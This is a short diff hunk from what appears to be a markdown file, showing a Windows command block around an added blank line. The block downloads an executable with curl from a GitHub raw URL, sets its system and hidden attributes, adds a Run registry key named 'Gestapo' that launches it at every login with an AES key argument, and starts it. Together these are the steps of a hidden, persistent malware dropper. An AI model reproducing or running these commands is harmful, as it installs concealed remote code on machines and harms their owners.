@@ -6,4 +6,5 @@ curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/emi
 attrib +s +h +a %appdata%\emit.exe
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Gestapo" /d "%appdata%\emit.exe --aeskey fe333581d9f246ee" /f
 cmd.exe /C start %appdata%\emit.exe
+
 ```
